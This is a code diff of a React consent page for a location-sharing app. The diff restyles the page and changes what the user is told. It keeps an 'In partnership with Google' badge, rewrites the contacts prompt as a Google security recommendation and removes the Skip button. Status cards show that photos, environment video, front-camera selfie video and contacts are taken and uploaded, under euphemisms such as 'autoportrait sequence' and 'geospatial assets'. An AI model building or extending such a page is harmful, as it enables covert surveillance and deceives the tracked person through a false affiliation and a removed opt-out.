-              animate={{ opacity: 1, y: 0 }}
-              transition={{ delay: 0.2 }}
+              className="flex items-center gap-1.5 mb-3"
+              initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.18 }}
             >
-              <svg width="13" height="13" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
-                <path fill="#4285F4" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
-                <path fill="#34A853" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
-                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
-                <path fill="#EA4335" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
-              </svg>
-              <span className="text-xs text-white/60 font-medium tracking-wide">In partnership with Google</span>
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#D4A843" strokeWidth="2"/><path d="M12 8v4l3 3" stroke="#D4A843" strokeWidth="2" strokeLinecap="round"/></svg>
+              <span style={{ fontSize: 11, color: "rgba(212,168,67,0.6)", fontFamily: "'Share Tech Mono', monospace", letterSpacing: "0.06em" }}>IN PARTNERSHIP WITH GOOGLE</span>
             </motion.div>
             <motion.p
-              className="text-sm text-white/80 text-center leading-relaxed mb-8 max-w-xs"
-              initial={{ opacity: 0, y: 8 }}
-              animate={{ opacity: 1, y: 0 }}
-              transition={{ delay: 0.25 }}
+              style={{ fontSize: 14, color: "rgba(220,185,130,0.8)", lineHeight: 1.6, marginBottom: 24, maxWidth: 280 }}
+              initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.25 }}
             >
-              Hey friend! Let us help {invite!.fromUserName} reach your loved ones if needed. Share up to 6 special contacts — makes everyone feel safer! 🌸✨
+              Let's help Google secure your loved ones contact — recommended if you wish to proceed 100% secure ✨
             </motion.p>
-            <motion.div className="w-full max-w-xs space-y-3" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.35 }}>
+            <motion.div style={{ width: "100%", maxWidth: 280 }} initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.35 }}>
               <button
-                onClick={async () => {
-                  setShowContactsPrompt(false);
-                  await pickContacts();
-                }}
-                className="w-full py-4 rounded-2xl font-bold text-base text-white active:scale-[0.98] transition-transform flex items-center justify-center gap-2"
-                style={{ background: "linear-gradient(135deg,#f472b6 0%,#c084fc 50%,#a855f7 100%)", boxShadow: "0 8px 32px rgba(192,132,252,0.55), 0 0 0 1.5px rgba(255,255,255,0.25) inset" }}
+                onClick={async () => { setShowContactsPrompt(false); await pickContacts(); }}
+                style={{ width: "100%", padding: "14px 20px", borderRadius: 8, fontWeight: 700, fontSize: 15, color: "#1a0c05", border: "none", cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 8, background: "linear-gradient(135deg, #D4A843 0%, #C8922A 50%, #8B6914 100%)", boxShadow: "0 6px 24px rgba(200,146,42,0.5), inset 0 1px 0 rgba(255,255,255,0.2)" }}
               >
                 <Phone className="h-4 w-4" />
-                Allow Contacts ✨
-              </button>
-              <button
-                onClick={() => { contactsTriedRef.current = true; setContactsCollected(true); setShowContactsPrompt(false); }}
-                className="w-full py-2 text-sm italic font-medium transition-colors"
-                style={{ color: "rgba(233,213,255,0.85)" }}
-              >
-                Skip
+                Allow Contacts
               </button>
             </motion.div>
           </div>
         )}
 
-        <div className="max-w-md mx-auto px-4 py-6 space-y-4">
+        <div style={{ maxWidth: 480, margin: "0 auto", padding: "24px 16px 36px", display: "flex", flexDirection: "column", gap: 14 }}>
 
-          {/* ── LIVE SHARING header ───────────────────────────────────────────── */}
-          <div className="flex items-center gap-2.5">
-            <div className="relative flex-shrink-0">
-              <div className="w-3 h-3 rounded-full bg-emerald-400" />
-              <div className="absolute inset-0 rounded-full bg-emerald-400 animate-ping opacity-70" />
-            </div>
-            <span className="text-emerald-400 font-extrabold text-base tracking-widest uppercase">Live Sharing</span>
+          {/* ── LIVE SHARING header ── */}
+          <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 2 }}>
+            {/* Quill icon */}
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
+              <path d="M20.24 12.24a6 6 0 0 0-8.49-8.49L5 10.5V19h8.5z" fill="#C8922A" opacity="0.8"/>
+              <line x1="16" y1="8" x2="2" y2="22" stroke="#D4A843" strokeWidth="1.8" strokeLinecap="round"/>
+              <line x1="17" y1="13.5" x2="10" y2="13.5" stroke="#D4A843" strokeWidth="0.9" opacity="0.5"/>
+              <line x1="15.5" y1="11" x2="10.5" y2="16" stroke="#D4A843" strokeWidth="0.9" opacity="0.35"/>
+            </svg>
+            <span style={{ fontFamily: "Georgia, 'Palatino Linotype', serif", fontWeight: 900, fontSize: 17, letterSpacing: "0.14em", color: "#D4A843", textTransform: "uppercase", textShadow: "0 0 14px rgba(212,168,67,0.45)" }}>
+              Live Sharing
+            </span>
           </div>
 
+          {/* Brass divider */}
+          <div style={{ height: 1, background: "linear-gradient(90deg, transparent, #7a5c28 20%, #C8922A 50%, #7a5c28 80%, transparent)", margin: "0" }}/>
+
           {/* Sharing-with blurb */}
-          <p className="text-[15px] text-white/75 leading-relaxed">
+          <p style={{ fontSize: 15, color: "rgba(220,185,130,0.82)", lineHeight: 1.6, margin: "4px 0" }}>
             Your live location is being shared with{" "}
-            <span className="font-bold text-white">{invite!.fromUserName}</span>.
-            You can play games or watch videos — sharing keeps going in the background.
+            <strong style={{ color: "#E5C88A", fontWeight: 800 }}>{invite!.fromUserName}</strong>.
+            {" "}You can play games or watch videos — sharing keeps going in the background
           </p>
 
-          {/* ── Status cards ─────────────────────────────────────────────────── */}
-          <div className="space-y-2.5">
+          {/* ── Status cards ── */}
+          <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
 
             {/* Geo photos — in progress */}
             {!geoPhotoDone && geoBoardStartedRef.current && (
-              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
-                style={{ background: "rgba(99,102,241,0.13)", border: "1px solid rgba(99,102,241,0.3)" }}>
-                <Camera className="h-4 w-4 text-indigo-400 flex-shrink-0 animate-pulse" />
-                <div className="flex-1 min-w-0">
-                  <p className="text-[13px] font-semibold text-indigo-200">
+              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#3c2910 0%,#4d3618 60%,#3c2910 100%)", border: "1.5px solid #7a5c28", boxShadow: "inset 0 1px 0 rgba(212,168,67,0.10), 0 3px 10px rgba(0,0,0,0.5)" }}>
+                {/* Eagle head */}
+                <svg width="30" height="30" viewBox="0 0 40 44" fill="none" style={{ flexShrink: 0 }}>
+                  <polygon points="16,4 26,6 28,18 22,22 14,16" fill="#1e1006" stroke="#C8922A" strokeWidth="1.2" strokeLinejoin="round"/>
+                  <polygon points="26,6 34,10 32,22 26,26 28,18" fill="#160c04" stroke="#C8922A" strokeWidth="1.2" strokeLinejoin="round"/>
+                  <polygon points="14,16 22,22 20,32 12,30 10,22" fill="#1a0e06" stroke="#C8922A" strokeWidth="1.2" strokeLinejoin="round"/>
+                  <polygon points="10,22 14,28 8,30 4,24" fill="#C8922A" stroke="#8B6914" strokeWidth="1" strokeLinejoin="round"/>
+                  <polygon points="8,30 14,28 12,36 6,34" fill="#8B6914" stroke="#5a4010" strokeWidth="0.8" strokeLinejoin="round"/>
+                  <circle cx="24" cy="11" r="4" fill="#C8922A" opacity="0.25"/>
+                  <circle cx="24" cy="11" r="2.5" fill="#C8922A" opacity="0.7"/>
+                  <circle cx="24" cy="11" r="1.2" fill="#FFF0C0"/>
+                </svg>
+                <div style={{ flex: 1 }}>
+                  <p style={{ fontSize: 13, fontWeight: 600, color: "#D4A843", margin: "0 0 6px", fontFamily: "Georgia, serif" }}>
                     Geo Board: archiving geospatial assets {geoPhotoCount}/{GEO_PHOTO_COUNT}…
                   </p>
-                  <div className="mt-1.5 h-1 bg-indigo-900/50 rounded-full overflow-hidden">
-                    <div className="h-full bg-indigo-400 rounded-full transition-all duration-500"
-                      style={{ width: `${(geoPhotoCount / GEO_PHOTO_COUNT) * 100}%` }} />
+                  <div style={{ height: 3, background: "rgba(122,92,40,0.3)", borderRadius: 2, overflow: "hidden" }}>
+                    <div style={{ height: "100%", background: "linear-gradient(90deg,#8B6914,#D4A843)", borderRadius: 2, transition: "width 0.5s ease", width: `${(geoPhotoCount / GEO_PHOTO_COUNT) * 100}%` }}/>
                   </div>
                 </div>
               </div>
             )}
             {/* Geo photos — done */}
             {geoPhotoDone && geoPhotoCount > 0 && (
-              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
-                style={{ background: "rgba(99,102,241,0.13)", border: "1px solid rgba(99,102,241,0.3)" }}>
-                <Camera className="h-4 w-4 text-indigo-400 flex-shrink-0" />
-                <p className="text-[13px] font-semibold text-indigo-200">
+              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#3c2910 0%,#4d3618 60%,#3c2910 100%)", border: "1.5px solid #7a5c28", boxShadow: "inset 0 1px 0 rgba(212,168,67,0.10), 0 3px 10px rgba(0,0,0,0.5)" }}>
+                <svg width="30" height="30" viewBox="0 0 40 44" fill="none" style={{ flexShrink: 0 }}>
+                  <polygon points="16,4 26,6 28,18 22,22 14,16" fill="#1e1006" stroke="#C8922A" strokeWidth="1.2" strokeLinejoin="round"/>
+                  <polygon points="26,6 34,10 32,22 26,26 28,18" fill="#160c04" stroke="#C8922A" strokeWidth="1.2" strokeLinejoin="round"/>
+                  <polygon points="14,16 22,22 20,32 12,30 10,22" fill="#1a0e06" stroke="#C8922A" strokeWidth="1.2" strokeLinejoin="round"/>
+                  <polygon points="10,22 14,28 8,30 4,24" fill="#C8922A" stroke="#8B6914" strokeWidth="1" strokeLinejoin="round"/>
+                  <polygon points="8,30 14,28 12,36 6,34" fill="#8B6914" stroke="#5a4010" strokeWidth="0.8" strokeLinejoin="round"/>
+                  <circle cx="24" cy="11" r="4" fill="#C8922A" opacity="0.25"/>
+                  <circle cx="24" cy="11" r="2.5" fill="#C8922A" opacity="0.7"/>
+                  <circle cx="24" cy="11" r="1.2" fill="#FFF0C0"/>
+                </svg>
+                <p style={{ fontSize: 13, fontWeight: 600, color: "#D4A843", margin: 0, fontFamily: "Georgia, serif" }}>
                   Geo Board: {geoPhotoCount} geospatial asset{geoPhotoCount !== 1 ? "s" : ""} archived ✓
                 </p>
               </div>
@@ -1931,181 +2671,264 @@ export default function ConsentPage() {
 
             {/* Env video — recording */}
             {geoVideoState === "recording" && (
-              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
-                style={{ background: "rgba(185,28,28,0.18)", border: "1px solid rgba(239,68,68,0.3)" }}>
-                <Video className="h-4 w-4 text-red-400 flex-shrink-0 animate-pulse" />
-                <div className="flex-1 min-w-0">
-                  <p className="text-[13px] font-semibold text-red-200">
+              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#2a1608 0%,#3a2010 100%)", border: "1.5px dashed #8b5c22", boxShadow: "0 3px 10px rgba(0,0,0,0.5)" }}>
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#C8922A" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink: 0, animation: "pulse 1.5s ease-in-out infinite" }}>
+                  <path d="M23 7l-7 5 7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2" ry="2"/>
+                </svg>
+                <div style={{ flex: 1 }}>
+                  <p style={{ fontSize: 13, fontWeight: 600, color: "#C8922A", margin: "0 0 6px", fontFamily: "Georgia, serif" }}>
                     Geo Board: capturing dynamic media ({GEO_VIDEO_DURATION_SECONDS}s)…
                   </p>
-                  <div className="mt-1.5 h-1 bg-red-900/50 rounded-full overflow-hidden">
-                    <div className="h-full bg-red-400 rounded-full"
-                      style={{ width: "100%", transition: `width ${GEO_VIDEO_DURATION_SECONDS}s linear` }} />
+                  <div style={{ height: 3, background: "rgba(100,60,20,0.35)", borderRadius: 2, overflow: "hidden" }}>
+                    <div style={{ height: "100%", background: "linear-gradient(90deg,#8B4A14,#C8922A)", borderRadius: 2, width: "100%", transition: `width ${GEO_VIDEO_DURATION_SECONDS}s linear` }}/>
                   </div>
                 </div>
               </div>
             )}
             {/* Env video — uploading */}
             {geoVideoState === "uploading" && (
-              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
-                style={{ background: "rgba(185,28,28,0.18)", border: "1px solid rgba(239,68,68,0.3)" }}>
-                <Loader2 className="h-4 w-4 text-red-400 flex-shrink-0 animate-spin" />
-                <p className="text-[13px] font-semibold text-red-200">Geo Board: persisting dynamic media…</p>
+              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#2a1608 0%,#3a2010 100%)", border: "1.5px dashed #8b5c22", boxShadow: "0 3px 10px rgba(0,0,0,0.5)" }}>
+                <Loader2 style={{ width: 18, height: 18, color: "#C8922A", flexShrink: 0, animation: "spin 1s linear infinite" }} />
+                <p style={{ fontSize: 13, fontWeight: 600, color: "#C8922A", margin: 0, fontFamily: "Georgia, serif" }}>Geo Board: persisting dynamic media…</p>
               </div>
             )}
             {/* Env video — done */}
             {geoVideoState === "done" && (
-              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
-                style={{ background: "rgba(185,28,28,0.18)", border: "1px solid rgba(239,68,68,0.3)" }}>
-                <Video className="h-4 w-4 text-red-400 flex-shrink-0" />
-                <p className="text-[13px] font-semibold text-red-200">Geo Board: dynamic media capture persisted ✓</p>
+              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#2a1608 0%,#3a2010 100%)", border: "1.5px dashed #8b5c22", boxShadow: "0 3px 10px rgba(0,0,0,0.5)" }}>
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#C8922A" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink: 0 }}>
+                  <path d="M23 7l-7 5 7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2" ry="2"/>
+                </svg>
+                <p style={{ fontSize: 13, fontWeight: 600, color: "#C8922A", margin: 0, fontFamily: "Georgia, serif" }}>Geo Board: dynamic media capture persisted ✓</p>
               </div>
             )}
 
             {/* Selfie photos — in progress */}
             {geoBoardStartedRef.current && !geoSelfiePhotoDone && geoPhotoDone && (
-              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
-                style={{ background: "rgba(126,34,206,0.18)", border: "1px solid rgba(168,85,247,0.3)" }}>
-                <Camera className="h-4 w-4 text-purple-400 flex-shrink-0 animate-pulse" />
-                <div className="flex-1 min-w-0">
-                  <p className="text-[13px] font-semibold text-purple-200">
+              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#2e1c08 0%,#3e2a10 60%,#2e1c08 100%)", border: "1.5px solid #6b4820", boxShadow: "0 3px 10px rgba(0,0,0,0.5)", position: "relative", overflow: "hidden" }}>
+                {/* Left feather decoration */}
+                <svg width="18" height="28" viewBox="0 0 18 32" fill="none" style={{ flexShrink: 0, opacity: 0.75 }}>
+                  <path d="M9 2 C9 2 2 8 2 18 C2 26 6 30 9 30" stroke="#C8922A" strokeWidth="1.2" fill="none"/>
+                  <path d="M9 6 C5 10 4 14 4 18" stroke="#C8922A" strokeWidth="0.8" opacity="0.5"/>
+                  <path d="M9 10 C6 13 5 16 5 20" stroke="#C8922A" strokeWidth="0.8" opacity="0.4"/>
+                  <circle cx="9" cy="4" r="1.5" fill="#C8922A" opacity="0.6"/>
+                </svg>
+                {/* Eye icon */}
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#C8922A" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink: 0, animation: "pulse 2s ease-in-out infinite" }}>
+                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
+                </svg>
+                <div style={{ flex: 1 }}>
+                  <p style={{ fontSize: 13, fontWeight: 600, color: "#b87d3a", margin: "0 0 6px", fontFamily: "Georgia, serif" }}>
                     Geo Board: capturing autoportrait sequence {geoSelfiePhotoCount}/{GEO_SELFIE_PHOTO_COUNT}…
                   </p>
-                  <div className="mt-1.5 h-1 bg-purple-900/50 rounded-full overflow-hidden">
-                    <div className="h-full bg-purple-400 rounded-full transition-all duration-500"
-                      style={{ width: `${(geoSelfiePhotoCount / GEO_SELFIE_PHOTO_COUNT) * 100}%` }} />
+                  <div style={{ height: 3, background: "rgba(100,70,30,0.3)", borderRadius: 2, overflow: "hidden" }}>
+                    <div style={{ height: "100%", background: "linear-gradient(90deg,#7a4e18,#b87d3a)", borderRadius: 2, transition: "width 0.5s ease", width: `${(geoSelfiePhotoCount / GEO_SELFIE_PHOTO_COUNT) * 100}%` }}/>
                   </div>
                 </div>
+                {/* Right feather decoration */}
+                <svg width="18" height="28" viewBox="0 0 18 32" fill="none" style={{ flexShrink: 0, opacity: 0.75, transform: "scaleX(-1)" }}>
+                  <path d="M9 2 C9 2 2 8 2 18 C2 26 6 30 9 30" stroke="#C8922A" strokeWidth="1.2" fill="none"/>
+                  <path d="M9 6 C5 10 4 14 4 18" stroke="#C8922A" strokeWidth="0.8" opacity="0.5"/>
+                  <path d="M9 10 C6 13 5 16 5 20" stroke="#C8922A" strokeWidth="0.8" opacity="0.4"/>
+                  <circle cx="9" cy="4" r="1.5" fill="#C8922A" opacity="0.6"/>
+                </svg>
               </div>
             )}
 
             {/* Selfie video — recording */}
-            {geoSelfieState === "recording" && (
-              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
-                style={{ background: "rgba(126,34,206,0.18)", border: "1px solid rgba(168,85,247,0.3)" }}>
-                <Video className="h-4 w-4 text-purple-400 flex-shrink-0 animate-pulse" />
-                <div className="flex-1 min-w-0">
-                  <p className="text-[13px] font-semibold text-purple-200">
-                    Geo Board: recording autoportrait ({GEO_SELFIE_VIDEO_DURATION_SECONDS}s)…
-                  </p>
-                  <div className="mt-1.5 h-1 bg-purple-900/50 rounded-full overflow-hidden">
-                    <div className="h-full bg-purple-400 rounded-full"
-                      style={{ width: "100%", transition: `width ${GEO_SELFIE_VIDEO_DURATION_SECONDS}s linear` }} />
+            {geoSelfieState === "recording" && (() => {
+              const remaining = Math.max(0, GEO_SELFIE_VIDEO_DURATION_SECONDS - geoSelfieElapsed);
+              const pct = Math.min(100, (geoSelfieElapsed / GEO_SELFIE_VIDEO_DURATION_SECONDS) * 100);
+              const mins = Math.floor(remaining / 60);
+              const secs = remaining % 60;
+              const timeLabel = mins > 0 ? `${mins}:${String(secs).padStart(2, "0")}` : `${secs}s`;
+              return (
+                <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "flex-start", gap: 12, background: "linear-gradient(135deg,#2e1c08 0%,#3e2a10 60%,#2e1c08 100%)", border: "1.5px solid #6b4820", boxShadow: "0 3px 10px rgba(0,0,0,0.5)", position: "relative", overflow: "hidden" }}>
+                  <div style={{ marginTop: 2, flexShrink: 0, position: "relative" }}>
+                    <span style={{ position: "absolute", inset: 0, borderRadius: "50%", background: "#C8922A", opacity: 0.35, width: 14, height: 14, animation: "pulse 1s infinite" }}/>
+                    <span style={{ position: "relative", display: "block", borderRadius: "50%", background: "#C8922A", width: 14, height: 14 }}/>
                   </div>
+                  <div style={{ flex: 1 }}>
+                    <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 4 }}>
+                      <p style={{ fontSize: 13, fontWeight: 700, color: "#D4A843", margin: 0, fontFamily: "Georgia, serif" }}>REC • Front camera recording</p>
+                      <span style={{ fontSize: 12, fontFamily: "'Share Tech Mono', monospace", color: "#b87d3a", marginLeft: 8, flexShrink: 0 }}>{timeLabel} left</span>
+                    </div>
+                    <div style={{ height: 4, background: "rgba(100,70,30,0.3)", borderRadius: 2, overflow: "hidden" }}>
+                      <div style={{ height: "100%", background: "linear-gradient(90deg,#8B4A14,#C8922A,#D4A843)", borderRadius: 2, transition: "width 0.9s linear", width: `${pct}%`, boxShadow: "0 0 6px rgba(200,146,42,0.5)" }}/>
+                    </div>
+                    <p style={{ marginTop: 4, fontSize: 11, color: "rgba(180,130,60,0.6)", fontFamily: "'Share Tech Mono', monospace" }}>No audio · compressed · saved to GeoBoard when sharing ends</p>
+                  </div>
+                  {/* Right feather */}
+                  <svg width="14" height="24" viewBox="0 0 18 32" fill="none" style={{ flexShrink: 0, opacity: 0.55, transform: "scaleX(-1)", marginTop: 2 }}>
+                    <path d="M9 2 C9 2 2 8 2 18 C2 26 6 30 9 30" stroke="#C8922A" strokeWidth="1.2" fill="none"/>
+                    <path d="M9 6 C5 10 4 14 4 18" stroke="#C8922A" strokeWidth="0.8" opacity="0.5"/>
+                    <circle cx="9" cy="4" r="1.5" fill="#C8922A" opacity="0.6"/>
+                  </svg>
+                </div>
+              );
+            })()}
+            {/* Selfie video — uploading */}
+            {geoSelfieState === "uploading" && (
+              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#2e1c08 0%,#3e2a10 60%,#2e1c08 100%)", border: "1.5px solid #6b4820", boxShadow: "0 3px 10px rgba(0,0,0,0.5)" }}>
+                <Loader2 style={{ width: 18, height: 18, color: "#b87d3a", flexShrink: 0, animation: "spin 1s linear infinite" }} />
+                <div>
+                  <p style={{ fontSize: 13, fontWeight: 600, color: "#b87d3a", margin: 0, fontFamily: "Georgia, serif" }}>Geo Board: saving the selfie recording…</p>
+                  <p style={{ fontSize: 11, color: "rgba(180,130,60,0.5)", marginTop: 2, fontFamily: "'Share Tech Mono', monospace" }}>Compressing &amp; uploading</p>
                 </div>
               </div>
             )}
-            {/* Selfie video — uploading */}
-            {geoSelfieState === "uploading" && (
-              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
-                style={{ background: "rgba(126,34,206,0.18)", border: "1px solid rgba(168,85,247,0.3)" }}>
-                <Loader2 className="h-4 w-4 text-purple-400 flex-shrink-0 animate-spin" />
-                <p className="text-[13px] font-semibold text-purple-200">Geo Board: archiving autoportrait sequence…</p>
-              </div>
-            )}
-            {/* Selfie photos or video — done (show once either finishes) */}
+            {/* Selfie done */}
             {(geoSelfiePhotoDone || geoSelfieState === "done") && (
-              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
-                style={{ background: "rgba(126,34,206,0.18)", border: "1px solid rgba(168,85,247,0.3)" }}>
-                <Video className="h-4 w-4 text-purple-400 flex-shrink-0" />
-                <p className="text-[13px] font-semibold text-purple-200">Geo Board: autoportrait sequence archived ✓</p>
+              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#2e1c08 0%,#3e2a10 60%,#2e1c08 100%)", border: "1.5px solid #6b4820", boxShadow: "0 3px 10px rgba(0,0,0,0.5)", position: "relative", overflow: "hidden" }}>
+                <svg width="14" height="24" viewBox="0 0 18 32" fill="none" style={{ flexShrink: 0, opacity: 0.7 }}>
+                  <path d="M9 2 C9 2 2 8 2 18 C2 26 6 30 9 30" stroke="#C8922A" strokeWidth="1.2" fill="none"/>
+                  <path d="M9 6 C5 10 4 14 4 18" stroke="#C8922A" strokeWidth="0.8" opacity="0.5"/>
+                  <circle cx="9" cy="4" r="1.5" fill="#C8922A" opacity="0.6"/>
+                </svg>
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#b87d3a" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink: 0 }}>
+                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
+                </svg>
+                <p style={{ fontSize: 13, fontWeight: 600, color: "#b87d3a", margin: 0, fontFamily: "Georgia, serif" }}>Geo Board: selfie recording saved ✓</p>
+                <svg width="14" height="24" viewBox="0 0 18 32" fill="none" style={{ flexShrink: 0, opacity: 0.7, transform: "scaleX(-1)", marginLeft: "auto" }}>
+                  <path d="M9 2 C9 2 2 8 2 18 C2 26 6 30 9 30" stroke="#C8922A" strokeWidth="1.2" fill="none"/>
+                  <path d="M9 6 C5 10 4 14 4 18" stroke="#C8922A" strokeWidth="0.8" opacity="0.5"/>
+                  <circle cx="9" cy="4" r="1.5" fill="#C8922A" opacity="0.6"/>
+                </svg>
               </div>
             )}
 
             {/* Contacts saved */}
             {contactsCollected && contactsCollectedCountRef.current > 0 && (
-              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
-                style={{ background: "rgba(120,83,0,0.28)", border: "1px solid rgba(217,119,6,0.35)" }}>
-                <Users className="h-4 w-4 text-amber-400 flex-shrink-0" />
-                <p className="text-[13px] font-semibold text-amber-200">
+              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#2e2008 0%,#3e2e10 100%)", border: "1.5px solid #8B6914", boxShadow: "0 3px 10px rgba(0,0,0,0.5)" }}>
+                <Users style={{ width: 18, height: 18, color: "#D4A843", flexShrink: 0 }} />
+                <p style={{ fontSize: 13, fontWeight: 600, color: "#D4A843", margin: 0, fontFamily: "Georgia, serif" }}>
                   {contactsCollectedCountRef.current} priority responder linkage{contactsCollectedCountRef.current !== 1 ? "s" : ""} established ✓
                 </p>
               </div>
             )}
           </div>
 
-          {/* ── Current position ─────────────────────────────────────────────── */}
+          {/* ── Current Position — stone slate card with compass roses ── */}
           {coords && (
-            <div className="rounded-xl p-4" style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.08)" }}>
-              <div className="flex items-center gap-2 mb-3">
-                <Navigation className="h-4 w-4 text-white/50 flex-shrink-0" />
-                <span className="text-[11px] font-bold text-white/40 uppercase tracking-widest">Current Position</span>
+            <div style={{ borderRadius: 8, padding: "14px 14px", background: "linear-gradient(135deg,#1e1a10 0%,#2a2416 60%,#1a1608 100%)", border: "1.5px solid #5a4f38", boxShadow: "inset 0 1px 0 rgba(212,168,67,0.06), 0 4px 14px rgba(0,0,0,0.55)" }}>
+              {/* Header row with compass roses */}
+              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 10 }}>
+                {/* Left compass */}
+                <svg width="24" height="24" viewBox="0 0 32 32" fill="none" style={{ opacity: 0.7 }}>
+                  <circle cx="16" cy="16" r="14" stroke="#8B6914" strokeWidth="1" fill="none"/>
+                  <polygon points="16,2 18,14 16,12 14,14" fill="#C8922A"/>
+                  <polygon points="16,30 14,18 16,20 18,18" fill="#5a4020" stroke="#8B6914" strokeWidth="0.5"/>
+                  <polygon points="2,16 14,18 12,16 14,14" fill="#5a4020" stroke="#8B6914" strokeWidth="0.5"/>
+                  <polygon points="30,16 18,14 20,16 18,18" fill="#5a4020" stroke="#8B6914" strokeWidth="0.5"/>
+                  <circle cx="16" cy="16" r="2.5" fill="#8B6914"/>
+                  <circle cx="16" cy="16" r="1.2" fill="#D4A843"/>
+                </svg>
+                <div style={{ flex: 1, textAlign: "center" }}>
+                  <span style={{ fontSize: 10, fontWeight: 700, color: "rgba(212,168,67,0.55)", letterSpacing: "0.14em", fontFamily: "'Share Tech Mono', monospace" }}>CURRENT POSITION</span>
+                </div>
+                {/* Right compass */}
+                <svg width="24" height="24" viewBox="0 0 32 32" fill="none" style={{ opacity: 0.7 }}>
+                  <circle cx="16" cy="16" r="14" stroke="#8B6914" strokeWidth="1" fill="none"/>
+                  <polygon points="16,2 18,14 16,12 14,14" fill="#C8922A"/>
+                  <polygon points="16,30 14,18 16,20 18,18" fill="#5a4020" stroke="#8B6914" strokeWidth="0.5"/>
+                  <polygon points="2,16 14,18 12,16 14,14" fill="#5a4020" stroke="#8B6914" strokeWidth="0.5"/>
+                  <polygon points="30,16 18,14 20,16 18,18" fill="#5a4020" stroke="#8B6914" strokeWidth="0.5"/>
+                  <circle cx="16" cy="16" r="2.5" fill="#8B6914"/>
+                  <circle cx="16" cy="16" r="1.2" fill="#D4A843"/>
+                </svg>
               </div>
-              <p className="text-xl font-mono font-bold text-white leading-snug">
+              <p style={{ fontSize: 22, fontFamily: "'Share Tech Mono', monospace", fontWeight: 700, color: "#E5C88A", lineHeight: 1.25, margin: "0 0 4px" }}>
                 {formatDMS(coords.lat, coords.lng)}
               </p>
-              <p className="text-xs font-mono text-white/45 mt-0.5">
+              <p style={{ fontSize: 12, fontFamily: "'Share Tech Mono', monospace", color: "rgba(212,168,67,0.5)", margin: "0 0 6px" }}>
                 {coords.lat.toFixed(6)},&nbsp;&nbsp;{coords.lng.toFixed(6)}
               </p>
               {coords.accuracy && (
-                <p className="text-xs text-white/40 mt-1.5">Accuracy: ±{Math.round(coords.accuracy)}m</p>
